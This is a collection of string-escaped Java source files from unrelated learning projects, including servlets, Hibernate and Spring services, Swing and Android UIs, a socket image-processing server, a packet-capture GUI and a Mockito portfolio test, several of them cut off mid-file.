    "package control;\r\n\r\nimport java.io.IOException;\r\n\r\nimport javax.servlet.RequestDispatcher;\r\nimport javax.servlet.ServletException;\r\nimport javax.servlet.annotation.WebServlet;\r\nimport javax.servlet.http.HttpServlet;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport javax.servlet.http.HttpServletResponse;\r\n\r\nimport dto.Product;\r\nimport operation.Operation;\r\n\r\n/**\r\n * \u66f4\u65b0\u51e6\u7406\u30b5\u30fc\u30d6\u30ec\u30c3\u30c8\r\n * @author M.Takahashi\r\n */\r\n@WebServlet(\"/update-servlet\")\r\npublic class UpdateServlet extends HttpServlet {\r\n\tprivate static final long serialVersionUID = 1L;\r\n       \r\n\t/**\r\n\t * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)\r\n\t */\r\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\r\n    \t// Product\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u4f5c\u6210\r\n    \trequest.setCharacterEncoding(\"UTF-8\");\r\n    \tProduct product = new Product();\r\n    \tproduct.setProductId(request.getParameter(\"id\"));\r\n    \tproduct.setProductName(request.getParameter(\"name\"));\r\n    \tproduct.setPrice(Integer.parseInt(request.getParameter(\"price\")));\r\n\r\n    \tString url = \"msg.jsp\";\t\t// \u8ee2\u9001\u5148\u306e\u521d\u671f\u5316\r\n\r\n\t\ttry {\r\n\t\t\t// \u66f4\u65b0\u51e6\u7406\r\n\t\t\tOperation op = new Operation();\r\n\t\t\top.updateProd(product);\r\n\t\t\t// \u5b8c\u4e86\u30e1\u30c3\u30bb\u30fc\u30b8\r\n\t\t\trequest.setAttribute(\"msg\", \"\u66f4\u65b0\u51e6\u7406\u304c\u5b8c\u4e86\u3057\u307e\u3057\u305f\u3002\");\t\r\n\t\t} catch (Exception e) {\r\n\t\t\trequest.setAttribute(\"errorMsg\", \"\u66f4\u65b0\u6642\u306b\u30a8\u30e9\u30fc\u304c\u767a\u751f\u3057\u307e\u3057\u305f\u3002\");\t\r\n\t\t}\r\n\r\n\t    // \u30ea\u30af\u30a8\u30b9\u30c8\u306e\u8ee2\u9001\r\n\t    RequestDispatcher rd = request.getRequestDispatcher(url);\r\n\t    rd.forward(request, response);\r\n\t}\r\n\r\n\r\n}\r\n",
    "package tugaspertemuan7;\r\n\r\nimport java.io.*;\r\nimport java.util.*;\r\npublic class pertemuan7\r\n{\r\n\r\n\tpublic static void main(String args[]) \r\n\t{ \r\n\t\t// pembuatan objek\r\n        SelectionSort ob = new SelectionSort(); \r\n        StopWatch sw = new StopWatch();\r\n        Scanner key = new Scanner(System.in);\r\n\r\n        // deklarasi variabel\r\n\t\tint max, min, range, nilaiRandom; //inputnya nilai random, sedangkan max, min dan range mendapatkan nilai random\r\n        String pilih; //var string utk memilih apakah akan menampilkan hasil sorting atau tidak\r\n        int arr[] = new int[100000];\r\n\r\n        // input data\r\n        max = arr.length; //max nya diambil dari jmlh max array\r\n        min = 1; //batas nilai random dari 1 - 100.000\r\n        range = max - min + 1;\r\n\r\n        for(int i=0;i<max;i++){ //input array, perulangan dan input 100k kali\r\n            nilaiRandom = (int)(Math.random() * range) + min; //input nilai random\r\n            arr[i] = nilaiRandom;\r\n        }\r\n\r\n        for(int i=0;i<max;i++){ //memnampilkan array yg sudah di input\r\n            System.out.print(arr[i]+\" \");\r\n        }\r\n        System.out.println(\"\");\r\n        System.out.println(\"\");\r\n        \r\n        //proses sorting\r\n        sw.start(); //untuk memulai waktu sorting\r\n        ob.sort(arr); //untuk sorting\r\n        sw.stop(); //untuk waktu akhir sorting\r\n        \r\n        //menampilkan output\r\n        System.out.println(\"Lama Sorting : \"+sw.getElapsedTime()+\" Milidetik\"); //menampilkan hasil lama sorting\r\n        System.out.print(\"Tampilkan hasil sorting [y/n] : \");\r\n        pilih = key.nextLine();\r\n        if(pilih.equals(\"Y\") || pilih.equals(\"y\")){\r\n            System.out.println(\"Hasilnya : \");\r\n            ob.printArray(arr);\r\n        }\r\n\t} \r\n} \r\n\r\n\r\n",
    "package com.javacurse.ce.JavaJunior.Seminar.lesson4.hw;\n\n\nimport org.hibernate.Session;\nimport org.hibernate.SessionFactory;\nimport org.hibernate.Transaction;\nimport org.hibernate.cfg.Configuration;\n\n\nimport java.util.List;\n\npublic class Homework {\n\n    /**\n     * 1. \u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0441\u0443\u0449\u043d\u043e\u0441\u0442\u044c Student \u0441 \u043f\u043e\u043b\u044f\u043c\u0438:\n     * 1.1 id - int\n     * 1.2 firstName - string\n     * 1.3 secondName - string\n     * 1.4 age - int\n     * 2. \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c hibernate. \u0420\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u0442\u044c \u043f\u0440\u043e\u0441\u0442\u044b\u0435 \u0437\u0430\u043f\u0440\u043e\u0441\u044b: Find(by id), Persist, Merge, Remove\n     * 3. \u041f\u043e\u043f\u0440\u043e\u0431\u043e\u0432\u0430\u0442\u044c \u043d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u0437\u0430\u043f\u0440\u043e\u0441 \u043f\u043e\u0438\u0441\u043a\u0430 \u0432\u0441\u0435\u0445 \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u043e\u0432 \u0441\u0442\u0430\u0440\u0448\u0435 20 \u043b\u0435\u0442 (session.createQuery)\n     */\n    public static void main(String[] args) {\n        Configuration configure = new Configuration().configure();\n        try (SessionFactory sessionFactory = configure.buildSessionFactory()) {\n            insertStudent(sessionFactory);\n            getStudentsFromDatabase(sessionFactory);\n            System.out.println(FindById (sessionFactory,3L));\n\n\n\n        }\n\n\n    }\n    //Persist\n    public static void insertStudent(SessionFactory sessionFactory) {\n        try (Session session = sessionFactory.openSession()) {\n            Transaction transaction = session.beginTransaction();\n            Student e1 = new Student(1L, \"\u0415\u0432\u0433\u0435\u043d\u0438\u0439\", \"\u0421\u043e\u043b\u043e\u0432\u044c\u0435\u0432\", 35L);\n            session.persist(e1);\n            Student B2 = new Student(2L, \"\u0411\u043e\u0440\u0438\u0441\", \"\u0411\u043e\u0440\u0438\u0441\u043e\u0432\", 26L);\n            session.persist(B2);\n            Student B3 = new Student(3L, \"\u0421\u0435\u0440\u0433\u0435\u0439\", \"\u0421\u0435\u0440\u0433\u0435\u0435\u0432\", 28L);\n            session.persist(B3);\n            Student B4 = new Student(4L, \"\u041d\u0438\u043d\u0430\", \"\u041d\u0438\u043d\u043e\u0432\u043d\u0430\", 24L);\n            session.persist(B4);\n            Student B5 = new Student(5L, \"\u041a\u0430\u0442\u044f\", \"\u0415\u043a\u0430\u0442\u0435\u0440\u0438\u043d\u043e\u0432\u043d\u0430\", 23L);\n            session.persist(B5);\n            Student B6 = new Student(6L, \"\u0413\u043e\u0448\u0430\", \"\u041f\u0440\u043e\u0441\u0442\u043e\u0413\u043e\u0448\u0430\", 71L);\n            session.persist(B6);\n\n\n            transaction.commit();\n\n\n        }\n    }\n    public static void getStudentsFromDatabase(SessionFactory sessionFactory) {\n        List<Student> students = null;\n        try (Session session = sessionFactory.openSession()) {\n            Transaction transaction = session.beginTransaction();\n            students = session.createQuery(\"FROM Student\", Student.class).getResultList();\n            transaction.commit();\n            for (Student student : students) {\n                System.out.println(\"id = \" + student.getId() + \", firstName = \" + student.getFirstName() +\n                        \", secondName = \" + student.getSecondName() + \", age = \" + student.getAge());\n            }\n        }\n    }\n\n   // Find(by id)\n    public static Student FindById (SessionFactory sessionFactory,Long id){\n        Student student = null;\n        try(Session session = sessionFactory.openSession()) {\n            student = session.get(Student.class, id);\n            Transaction transaction = session.beginTransaction();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return student;\n    }\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "import java.io.*;\nimport java.net.*;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\n\npublic class S1 {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(12345);\n            System.out.println(\"Server started. Waiting for a client...\");\n\n            Socket clientSocket = serverSocket.accept();\n            System.out.println(\"Client connected.\");\n\n            ObjectInputStream inputStream = new ObjectInputStream(clientSocket.getInputStream());\n\n            byte[] imageData = (byte[]) inputStream.readObject();\n            ByteArrayInputStream bis = new ByteArrayInputStream(imageData);\n            BufferedImage image = ImageIO.read(bis);\n\n            int height = image.getHeight();\n            int width = image.getWidth();\n\n            // Extract red, green, and blue components from the BufferedImage\n            int[] pixels = image.getRGB(0, 0, width, height, null, 0, width);\n\n            int[] redOnly = new int[pixels.length];\n            int[] greenOnly = new int[pixels.length];\n            int[] blueOnly = new int[pixels.length];\n\n            for (int i = 0; i < pixels.length; i++) {\n                // Extract RGB components\n                int red = (pixels[i] >> 16) & 0xFF;\n                int green = (pixels[i] >> 8) & 0xFF;\n                int blue = pixels[i] & 0xFF;\n\n                // Reconstruct the pixel value with only red component\n                redOnly[i] = (red << 16) | 0x000000;\n\n                // Reconstruct the pixel value with only green component\n                greenOnly[i] = (0 << 16) | (green << 8) | 0x000000;\n\n                // Reconstruct the pixel value with only blue component\n                blueOnly[i] = (0 << 16) | (0 << 8) | blue;\n            }\n\n            ObjectOutputStream outputStream = new ObjectOutputStream(clientSocket.getOutputStream());\n            outputStream.writeObject(redOnly);\n            outputStream.writeObject(greenOnly);\n            outputStream.writeObject(blueOnly);\n\n            System.out.println(\"RGB components sent to the client.\");\n\n            inputStream.close();\n            outputStream.close();\n            clientSocket.close();\n            serverSocket.close();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
    "                                                        /*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage aplikasikasir_rima;\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport javax.swing.JOptionPane;\nimport java.text.SimpleDateFormat;\nimport java.util.Calendar;\nimport net.proteanit.sql.DbUtils;\n/**\n *\n * @author OWNER\n */\npublic class FormProduk extends javax.swing.JFrame {\nConnection konek;\nPreparedStatement pst;\nResultSet rst;\n    /**\n     * Creates new form FormProduk\n     */\n    public FormProduk() {\n        initComponents();\n        konek = Koneksi.koneksiDB();\n        mulai();\n        updateTabel();\n}\n    public void mulai() {\n       txtidproduk.setText(\"\");\n       txtnamaproduk.setText(\"\");\n       txtharga.setText(\"\");\n       txtstok.setText(\"\");\n}\n    \n    public void updateTabel() {\n        try {\n            String sql = \"select * from produk\";\n            pst = konek.prepareStatement(sql);\n            rst = pst.executeQuery();\n            tblproduk.setModel(DbUtils.resultSetToTableModel(rst));\n        } catch (Exception e) {\n            JOptionPane.showMessageDialog(null, \"Tidak terkoneksi ke tabel di database\");\n        }\n    }\n    \n    private void simpan() {\n        try {\n            String sql = \"insert into produk(ProdukID,NamaProduk,Harga,Stok) value (?,?,?,?)\";\n            pst = konek.prepareStatement(sql);\n            pst.setString(1, txtidproduk.getText());\n            pst.setString(2, txtnamaproduk.getText());\n            pst.setString(3, txtharga.getText());\n            pst.setString(4, txtstok.getText());\n            pst.execute();\n            JOptionPane.showMessageDialog(null, \"Data Sudah Disimpan\");\n        } catch (Exception e) {\n            JOptionPane.showMessageDialog(null, \"Data Gagal Disimpan\");\n        }\n\tupdateTabel();\n    }\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel5 = new javax.swing.JLabel();\n        jPanel2 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel4 = new javax.swing.JLabel();\n        txtidproduk = new javax.swing.JTextField();\n        txtnamaproduk = new javax.swing.JTextField();\n        txtharga = new javax.swing.JTextField();\n        txtstok = new javax.swing.JTextField();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        tblproduk = new javax.swing.JTable();\n        btnsimpan = new javax.swing.JButton();\n        btnedit = new javax.swing.JButton();\n        btnhapus = new javax.swing.JButton();\n        btnkeluar = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel1.setBackground(new java.awt.Color(102, 102, 102));\n\n        jLabel5.setBackground(new java.awt.Color(255, 255, 255));\n        jLabel5.setFont(new java.awt.Font(\"Segoe UI\", 1, 24)); // NOI18N\n        jLabel5.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel5.setIcon(new javax.swing.ImageIcon(getClass().getResource(\"/Image/icons8-product-26.png\"))); // NOI18N\n        jLabel5.setText(\"Input Produk\");\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGap(270, 270, 270)\n                .addComponent(jLabel5)\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n        );\n        jPanel1Layout.setVerticalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGap(29, 29, 29)\n                .addComponent(jLabel5)\n                .addContainerGap(31, Short.MAX_VALUE))\n        );\n\n        jPanel2.setBackground(new java.awt.Color(255, 153, 153));\n\n        jLabel1.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel1.setText(\"ID Produk\");\n\n        jLabel2.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel2.setText(\"Nama Produk\");\n\n        jLabel3.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel3.setText(\"Harga\");\n\n        jLabel4.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel4",
    "package com.cgm.admobileadlistviewandadapter;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.os.Bundle;\nimport android.widget.ArrayAdapter;\nimport android.widget.ListView;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        List<Country> list = new ArrayList<Country>();\n        Country vietnam = new Country(\"Vietnam\", \"vn\", 98000000);\n        Country usa = new Country(\"United States\", \"us\", 320000000);\n        Country russia = new Country(\"Russia\", \"ru\", 142000000);\n        list.add(vietnam); list.add(usa); list.add(russia);\n\n        ListView countryListView = findViewById(R.id.countryListView);\n\n        //ArrayAdapter<Country> adapter = new ArrayAdapter<Country>(this,\n                //android.R.layout.simple_list_item_1, list);\n        CustomListAdapter customListAdapter = new CustomListAdapter(list, this);\n\n        countryListView.setAdapter(customListAdapter);\n    }\n}",
    "package com.jamesvrooney.service;\n\nimport com.jamesvrooney.domain.Book;\nimport com.jamesvrooney.exception.BookAlreadyExistsException;\nimport com.jamesvrooney.exception.BookNotFoundException;\nimport com.jamesvrooney.repository.BookRepository;\nimport org.springframework.stereotype.Service;\n\n@Service\npublic class BookService {\n\n    private final BookRepository bookRepository;\n\n    public BookService(BookRepository bookRepository) {\n        this.bookRepository = bookRepository;\n    }\n\n    public Iterable<Book> viewBookList() {\n        return bookRepository.findAll();\n    }\n\n    public Book viewBookDetails(String isbn) {\n        return bookRepository.findByIsbn(isbn)\n                .orElseThrow(() -> new BookNotFoundException(isbn));\n    }\n\n    public Book addBookToCatalog(Book book) {\n        if (bookRepository.existsByIsbn(book.isbn())) {\n            throw new BookAlreadyExistsException(book.isbn());\n        }\n        return bookRepository.save(book);\n    }\n\n    public void removeBookFromCatalog(String isbn) {\n        bookRepository.deleteByIsbn(isbn);\n    }\n\n    public Book editBookDetails(String isbn, Book book) {\n        return bookRepository.findByIsbn(isbn)\n                .map(existingBook -> {\n                    var bookToUpdate = new Book(\n                            existingBook.isbn(),\n                            book.title(),\n                            book.author(),\n                            book.price());\n                    return bookRepository.save(bookToUpdate);\n                })\n                .orElseGet(() -> addBookToCatalog(book));\n    }\n\n}\n",
    "package com.learnleadgrow.ut.TestingDemo.service;\n\nimport com.learnleadgrow.ut.TestingDemo.model.Address;\nimport com.learnleadgrow.ut.TestingDemo.model.Student;\nimport com.learnleadgrow.ut.TestingDemo.repository.AddressRepository;\nimport com.learnleadgrow.ut.TestingDemo.repository.StudentRepository;\nimport org.springframework.stereotype.Service;\n\nimport java.util.List;\n\n@Service\npublic class StudentServiceImpl implements IStudentService{\n\n    private StudentRepository studentRepository;\n    private AddressRepository addressRepository;\n\n    public StudentServiceImpl(StudentRepository studentRepository, AddressRepository addressRepository) {\n        this.studentRepository = studentRepository;\n        this.addressRepository = addressRepository;\n    }\n\n    @Override\n    public Student createStudent(Student student) {\n        Student savedStudent = studentRepository.save(student);\n        List<Address> addressList = savedStudent.getAddress();\n        for(Address address: addressList) {\n            address.setStudent(savedStudent);\n        }\n        if(!(addressList == null)) {\n            addressRepository.saveAll(addressList);\n        }\n        return student;\n    }\n\n    @Override\n    public List<Student> getAllStudents() {\n        return studentRepository.findAll();\n    }\n\n    @Override\n    public Student getStudent(Long id) {\n        return studentRepository.findById(id).get();\n    }\n\n    @Override\n    public Student updateStudent(Long id, Student student) {\n        return null;\n    }\n\n    @Override\n    public String deleteStudent(Long id) {\n        studentRepository.deleteById(id);\n        return \"Deleted Successfully!\";\n    }\n}\n",
    "import jpcap.JpcapCaptor;\nimport jpcap.NetworkInterface;\nimport jpcap.NetworkInterfaceAddress;\nimport jpcap.packet.Packet;\nimport jpcap.packet.TCPPacket;\nimport javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.IOException;\nimport java.util.zip.CRC32;\n\npublic class Main {\n    //\u88ab\u9009\u4e2d\u7684\u7f51\u5361\u4e0b\u6807\n    static int Index = 0;\n    static JFrame frame;\n    static JPanel mainPanel;\n    public static void main(String[] args) {\n\n        // \u83b7\u53d6\u7f51\u5361\u5217\u8868\n        NetworkInterface[] devices = JpcapCaptor.getDeviceList();\n        // \u6253\u5370\u7f51\u5361\u4fe1\u606f\n        System.out.println(\"\u53ef\u7528\u7f51\u5361:\");\n        for (int i = 0; i < devices.length; i++) {\n            System.out.println(i + \": \" + devices[i].name + \" (\" + devices[i].description + \")\");\n            NetworkInterfaceAddress[] addresses = devices[i].addresses;\n            if (addresses != null && addresses.length > 0) {\n                    System.out.println(addresses[1].address.toString() + \"\\n\");\n            }\n        }\n\n        SwingUtilities.invokeLater(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    JpcapCaptor captor = JpcapCaptor.openDevice(devices[1], 65535, true, 20);\n                    createAndShowGUI(devices,captor);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n\n    }\n\n    private static void createAndShowGUI(NetworkInterface[] devices,JpcapCaptor captor) {\n        frame = new JFrame(\"TCP\u6570\u636e\u5305\u5206\u6790\u5668\");\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setSize(1500, 800);\n\n        // \u521b\u5efa\u4e3b\u9762\u677f\n        mainPanel = new JPanel();\n        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));\n        frame.getContentPane().add(mainPanel, BorderLayout.CENTER);\n\n        // \u521b\u5efa\u9009\u62e9\u7f51\u5361\u6309\u94ae\u548c\u663e\u793a\u7f51\u5361\u6807\u7b7e\u5e76\u6dfb\u52a0\u76d1\u542c\u5668\n        JButton jButton = new JButton(\"\u9009\u62e9\u7f51\u5361\");\n        jButton.setBounds(750, 50, 200, 30);\n        JLabel selectedInterfaceLabel = new JLabel();\n\n        //\u76d1\u542c\u4e8b\u4ef6\n        jButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                // \u5f39\u51fa\u9009\u62e9\u7f51\u5361\u5bf9\u8bdd\u6846\n                String[] interfaceNames = new String[devices.length];\n                for (int i = 0; i < devices.length; i++) {\n                    interfaceNames[i] = devices[i].name;\n                }\n                String selectedInterface = (String) JOptionPane.showInputDialog(frame,\n                        \"\u8bf7\u9009\u62e9\u4e00\u4e2a\u7f51\u5361\uff1a\", \"\u9009\u62e9\u7f51\u5361\", JOptionPane.PLAIN_MESSAGE, null, interfaceNames, interfaceNames[0]);\n                // \u5982\u679c\u7528\u6237\u9009\u62e9\u4e86\u7f51\u5361\uff0c\u5219\u66f4\u65b0\u6309\u94ae\u4e0b\u65b9\u7684\u6807\u7b7e\n                if (selectedInterface != null) {\n                    // \u5bfb\u627e\u9009\u62e9\u7684\u7f51\u5361\u5728interfaceNames\u6570\u7ec4\u4e2d\u7684\u4e0b\u6807\n                    for (int i = 0; i < interfaceNames.length; i++) {\n                        if (interfaceNames[i].equals(selectedInterface)) {\n                            Index = i;\n                            break;\n                        }\n                    }\n                    //\u663e\u793a\u9009\u62e9\u7684\u7f51\u5361\u540d\n                    NetworkInterfaceAddress[] addresses = devices[Index].addresses;\n                    selectedInterfaceLabel.setText(\"\u5df2\u9009\u62e9\u7684\u7f51\u5361\uff1a \"+addresses[1].address.toString()+\"\\n\");\n                }\n            }\n        });\n        // \u5c06\u6309\u94ae\u548c\u6807\u7b7e\u6dfb\u52a0\u5230\u4e3b\u9762\u677f\n        mainPanel.add(jButton);\n        mainPanel.add(selectedInterfaceLabel);\n\n        // \u5f00\u59cb\u6355\u83b7\n        JButton jButton2 = new JButton(\"\u5f00\u59cb\u6355\u83b7\");\n        jButton2.setBounds(750, 100, 200, 30);\n        NetworkInterface selectedDevice = devices[Index];\n        jButton2.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                try {\n                    // \u6253\u5f00\u9009\u5b9a\u7684\u7f51\u5361\u8fdb\u884c\u6570\u636e\u5305\u6355\u83b7\n//                    \u53ea\u80fd\u6355\u6349\u5230\u6700\u5f00\u59cb\u7684\u5efa\u7acb\u8fde\u63a5\u5305\n//                    JpcapCaptor captor = JpcapCaptor.openDevice(selectedDevice, 65535, true, 20);\n                    // \u5f00\u59cb\u6355\u83b7\u6570\u636e\u5305\n                    int i = 1;\n                    while (true) {\n                        Packet packet = captor.getPacket();\n//                        System.out.println(packet);\n//                        System.out.println(1);\n                        if (packet instanceof TCPPacket) {\n\n                            System.out.println(2);\n                            // \u5bf9TCP\u6570\u636e\u5305\u8fdb\u884c\u7b80\u8981\u5206\u6790\n                            TCPPacket tcpPacket = (TCPPacket) packet;\n\n\n                            JTable table = new JTable(13, 2);\n                            // \u8bbe\u7f6e\u7b2c\u4e00\u5217\u7684\u56fa\u5b9a\u6587\u672c\n                            table.setValueAt(\"\u7b2c\"+(i++)+\"\u4e2a\u6570\u636e\u5305\", 0, 0);\n                            table.setValueAt(\"\u6e90\u7aef\u53e3\", 1, 0);\n                            table.setValueAt(\"\u76ee\u7684\u7aef\u53e3\", 2, 0);\n                            table.setValueAt(\"\u5e8f\u53f7\", 3, 0);\n                            table.setValueAt(\"\u786e\u8ba4\u53f7\", 4, 0);\n                            table.setValueAt(\"\u6570\u636e\u504f\u79fb\", 5, 0);\n                            table.setValueAt(\"\u7a97\u53e3\u5927\u5c0f\", 6, 0);\n                            table.setValueAt(\"\u7d27\u6025\u6307\u9488\", 7, 0);\n                            table.setVa",
    "\npackage com.crio.warmup.stock.portfolio;\n\nimport static org.mockito.ArgumentMatchers.any;\nimport static org.mockito.ArgumentMatchers.eq;\n\nimport com.crio.warmup.stock.dto.AnnualizedReturn;\nimport com.crio.warmup.stock.dto.PortfolioTrade;\nimport com.crio.warmup.stock.dto.TiingoCandle;\nimport com.crio.warmup.stock.quotes.StockQuotesService;\nimport com.fasterxml.jackson.core.JsonProcessingException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;\nimport java.time.LocalDate;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.stream.Collectors;\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.mockito.InjectMocks;\nimport org.mockito.Mock;\nimport org.mockito.Mockito;\nimport org.mockito.Spy;\nimport org.mockito.junit.jupiter.MockitoExtension;\nimport org.springframework.web.client.RestTemplate;\n\n\n/*\nThis class is supposed to be used by assessments only.\n */\n@ExtendWith(MockitoExtension.class)\nclass PortfolioManagerTest {\n\n  @Mock\n  private StockQuotesService stockQuotesService;\n\n  @Mock\n  private RestTemplate restTemplate;\n\n  @Spy\n  @InjectMocks\n  private PortfolioManagerImpl portfolioManager;\n\n  private String googlQuotes = \"[{\\\"date\\\":\\\"2019-01-02T00:00:00.000Z\\\",\\\"close\\\":1054.68,\"\n      + \"\\\"high\\\":1060.79,\\\"low\\\":1025.28,\\\"open\\\":1027.2,\\\"volume\\\":1593395,\\\"adjClose\\\":1054.68,\"\n      + \"\\\"adjHigh\\\":1060.79,\\\"adjLow\\\":1025.28,\\\"\"\n      + \"adjOpen\\\":1027.2,\\\"adjVolume\\\":1593395,\\\"divCash\\\"\"\n      + \":0.0,\\\"splitFactor\\\":1.0},{\\\"date\\\":\\\"\"\n      + \"2019-01-03T00:00:00.000Z\\\",\\\"close\\\":1025.47,\\\"high\\\"\"\n      + \":1066.26,\\\"low\\\":1022.37,\\\"open\\\":1050.67,\\\"volume\\\":2097957,\\\"adjClose\\\":1025.47,\"\n      + \"\\\"adjHigh\\\":1066.26,\\\"adjLow\\\":1022.37,\\\"adjOpen\\\":1050.67,\\\"adjVolume\\\":2097957,\"\n      + \"\\\"divCash\\\":0.0,\\\"splitFactor\\\":1.0},{\\\"date\\\":\\\"2019-12-12T00:00:00.000Z\\\",\"\n      + \"\\\"close\\\":1348.49,\\\"high\\\":1080.0,\\\"low\\\":1036.86,\\\"open\\\":1042.56,\\\"volume\\\":2301428,\"\n      + \"\\\"adjClose\\\":1078.07,\\\"adjHigh\\\":1080.0,\\\"adjLow\\\":1036.86,\\\"adjOpen\\\":1042.56,\\\"adjVolume\"\n      + \"\\\":2301428,\\\"divCash\\\":0.0,\\\"splitFactor\\\":1.0}]\";\n\n  private String aaplQuotes = \"[{\\\"date\\\":\\\"2019-01-02T00:00:00.000Z\\\",\\\"close\\\":157.92,\\\"high\\\":\"\n      + \"158.85,\\\"low\\\":154.23,\\\"open\\\":154.89,\\\"volume\\\":37039737,\\\"adjClose\\\":155.575184502,\"\n      + \"\\\"adjHigh\\\":156.4913757481,\\\"adjLow\\\":151.9399740739,\\\"adjOpen\\\":152.590174313,\\\"adjVolume\"\n      + \"\\\":37039737,\\\"divCash\\\":0.0,\\\"splitFactor\\\":1.0},{\\\"date\\\":\\\"2019-01-03T00:00:00.000Z\\\",\"\n      + \"\\\"close\\\":142.19,\\\"high\\\":145.72,\\\"low\\\":142.0,\\\"open\\\":143.98,\\\"volume\\\":91312195,\"\n      + \"\\\"adjClose\\\":140.0787454682,\\\"adjHigh\\\":143.5563315959,\\\"adjLow\\\":139.8915666115,\\\"adjOpen\"\n      + \"\\\":141.842167329,\\\"adjVolume\\\":91312195,\\\"divCash\\\":0.0,\\\"splitFactor\\\":1.0},{\\\"date\\\":\"\n      + \"\\\"2019-12-12T00:00:00.000Z\\\",\\\"close\\\":271.46,\\\"high\\\":148.5499,\\\"low\\\":143.8,\\\"open\"\n      + \"\\\":144.53,\\\"volume\\\":58607070,\\\"adjClose\\\":146.0586173649,\\\"adjHigh\\\":146.3442128942,\"\n      + \"\\\"adjLow\\\":141.6648399911,\\\"adjOpen\\\":142.3840008617,\\\"adjVolume\\\":58607070,\\\"divCash\"\n      + \"\\\":0.0,\\\"splitFactor\\\":1.0}]\";\n\n  private String msftQuotes = \"[{\\\"date\\\":\\\"2019-01-02T00:00:00.000Z\\\",\\\"close\\\":101.12,\\\"high\\\"\"\n      + \":101.75,\\\"low\\\":98.94,\\\"open\\\":99.55,\\\"volume\\\":35329345,\\\"adjClose\\\":99.6386555235,\"\n      + \"\\\"adjHigh\\\":100.2594264193,\\\"adjLow\\\":97.490591154,\\\"adjOpen\\\":98.0916550372,\\\"adjVolume\"\n      + \"\\\":35329345,\\\"divCash\\\":0.0,\\\"splitFactor\\\":1.0},{\\\"date\\\":\\\"2019-01-03T00:00:00.000Z\\\",\"\n      + \"\\\"close\\\":97.4,\\\"high\\\":100.185,\\\"low\\\":97.2,\\\"open\\\":100.1,\\\"volume\\\":42578410,\\\"adjClose\"\n      + \"\\\":95.9731511866,\\\"adjHigh\\\":98.7173526861,\\\"adjLow\\\":95.7760810609,\\\"adjOpen\"\n      + \"\\\":98.6335978827,\\\"adjVolume\\\":42578410,\\\"divCash\\\":0.0,\\\"splitFactor\\\":1.0},{\\\"date\\\":\"\n      + \"\\\"2019-12-12T00:00:00.000Z\\\",\\\"close\\\":153.24,\\\"high\\\":102.51,\\\"low\\\":98.93,\\\"open\"\n      + \"\\\":99.72,\\\"volume\\\":44060620,\\\"adjClose\\\":100.4367895323,\\\"adjHigh\\\":101.0082928967,\"\n      + 